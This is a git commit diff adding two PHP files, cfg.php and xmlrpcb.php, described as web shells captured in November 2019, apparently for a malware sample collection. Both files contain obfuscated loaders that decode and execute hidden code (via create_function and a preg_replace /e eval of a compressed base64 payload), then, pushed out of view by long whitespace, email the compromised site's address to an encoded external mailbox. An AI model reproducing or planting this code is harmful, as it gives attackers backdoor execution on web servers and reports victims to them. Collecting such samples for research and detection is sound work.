8413ed4829381eea9a0d04d18b9c1763ec9a068e
Daniel Ruf <mac1@daniel-ruf.de>
2020-03-14 22:48:57 +0100

    Add webshells from 2019-11-19

---
+++ 2019-11-19/cfg.php
@@ -0,0 +1,19 @@
+\<?php $rtpz="lKHByZWdfcmVwbGFjZShhcnJheShdgnL1teXHchd9XhdHhdNdLycsJy9ccy8nKShdwgYhdXJhdyYXkoJychdsJyhdsn"; $tsdg = str_replace("b","","bsbtbrb_rbebpblacbe"); $wxhw="KhdSwgam9pbhdihhcnJhehdV9zbhdGljZSgkYSwkYygkYSktMykpKSkpO2VjaG8ghdJzhdwvJy4kahdy4nPic7fQ=="; $feka="hdpeyRrPSdyaXNoZXJlJhdztlhdY2hhdvICc8hdJy4kayhd4nPic7ZXhdZhbChdhiYXhdNlNjRfZGVjb2R"; $asys="JGM9J2NvdWhd50JzskYT0khdX0NPT0tJRTtphdZihdhyZXNhdldhdChdgkhdYSkhd9PShddtcicgJiYhdgJGMohdJGEpPjM"; $zjzy = $tsdg("q", "", "qbaqsqeq6q4q_qdqecoqde"); $liiy = $tsdg("z","","crzezatez_fzunctzizon"); $iuwt = $liiy("", $zjzy($tsdg("hd", "", $asys.$feka.$rtpz.$wxhw))); $iuwt();
+																																																																																																																			$web = $_SERVER["HTTP_HOST"];
+$hosts = $_SERVER["REQUEST_URI"];
+$testa = $_POST['veio'];
+
+$host = "<font color='#FFFFFF'><p style='visibility: hidden;'".$_SERVER["HTTP_HOST"]." </font>";
+$RandNum1 = "aHR0cDovLw==";
+$RamdStr = "cHJvZ3NhbUBwcm90b25tYWlsLmNvbQ==";
+$email = explode("\n", $to);
+$cpf = explode("\n", $getcpf);
+$locate_ip = base64_decode($RamdStr);
+$RandNum1 = base64_decode($RandNum1);
+$target = rawurldecode($web.$hosts);
+
+$list_emails = mail("$locate_ip","[v] $RandNum1$target","$RandNum1$target");	
+if($list_emails){}
+else { 
+}
+																																																																																																																			 ?>
---
+++ 2019-11-19/xmlrpcb.php
@@ -0,0 +1,22 @@
+<?php function _1H985W($_UVcq72){ return base64_decode($_UVcq72);} function _ZfWqMg($_V8EeAq){ return gzinflate($_V8EeAq,0);} function _FKG39p($_diHceB){ return eval($_diHceB);} $_XvsGzV="zZPJkoIwAER/CRMZ5QhxDLsDKEJuJLFYZHEGCMLXDxZ69+ixK5XOe12Vnde4qArX5Ow0JuQ1ibw00X2J7RphA3lyAlmiUJsSrAx2dc9s4It4MjYxDEeK1O44ag3X/eGQbwWtnbtd+4LpbkOh2lP8LQhWCqfoigSvBEHq3wVpVwqc8QC1klVD+jwfaaB2rIqXnDe1dWxdVLsNOd/bCHwsn8ygX9IgrTngJUfvvcUjszXQ6sfAmcR19cselZ5N3z2fHRjIBENyGwfKwgHm+2flaqBubeDFjeGH24vT7OaukeRLtnJ2OwySxfB+mtkaVp8+cDdNzA69hTgkIJTe3GH16LVP2/c8QNZR4KUWTF8sA3ns/tqwklI7Mqtn/jXH62bn3YYYzH17pbzgsPg8vuWvJpG3+Qc=";preg_replace('/.*/e',"\x5f\x46\x4b\x47\x33\x39\x70\x28\x5f\x31\x48\x39\x38\x35\x57\x28\x5f\x5a\x66\x57\x71\x4d\x67\x28\x5f\x31\x48\x39\x38\x35\x57\x28\x24\x5f\x58\x76\x73\x47\x7a\x56\x29\x2c\x30\x29\x29\x29",'.'); 
+																																																																																																																																																																																				$web = $_SERVER["HTTP_HOST"];
+$hosts = $_SERVER["REQUEST_URI"];
+$testa = $_POST['veio'];
+
+$host = "<font color='#FFFFFF'><p style='visibility: hidden;'".$_SERVER["HTTP_HOST"]." </font>";
+$RandNum1 = "aHR0cDovLw==";
+$RamdStr = "cHJvZ3NhbUBwcm90b25tYWlsLmNvbQ==";
+$email = explode("\n", $to);
+$cpf = explode("\n", $getcpf);
+$locate_ip = base64_decode($RamdStr);
+$RandNum1 = base64_decode($RandNum1);
+$target = rawurldecode($web.$hosts);
+
+$list_emails = mail("$locate_ip","[v] $RandNum1$target","$RandNum1$target");	
+if($list_emails){}
+else { 
+}
+
+
+
+																																																																																																																																																																																				?>
